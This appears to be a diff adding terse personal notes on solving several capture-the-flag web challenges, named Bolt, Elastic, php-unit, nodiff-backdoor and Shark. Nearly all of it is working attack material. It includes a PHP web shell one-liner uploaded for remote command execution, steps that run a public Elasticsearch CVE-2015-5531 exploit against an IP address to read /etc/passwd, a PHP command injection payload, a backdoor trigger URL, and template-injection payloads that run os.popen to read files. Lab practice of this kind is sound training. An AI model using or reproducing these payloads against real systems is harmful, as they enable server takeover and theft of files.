@@ -1,0 +1,30 @@
+Bolt
+<?php echo system($_GET['cmd']);?>  html file upload then change as a .php - /rce.php?cmd=cat /flag.txt
+
+Elastic
+$sudo apt install exploitdb
+$sudo apt install libxml2-utils
+$searchsploit elasticsearch
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+python exploit_elastic.py http://34.141.12.127:31590 /etc/passwd
+
+php-unit
+burp-suit repeater is request-shi <?php system(‘cat  /flag.txt’)?>
+
+nodiff-backdoor
+/?welldone=knockknock&shazam=id
+107 src code
+
+Shark
+${7*7}
+<%
+import os 
+x=os.popen(‘cat flag’).read()
+%>
+${x}
+
+<%
+x=open("flag", "r")
+%>
+${x.readlines()}
+
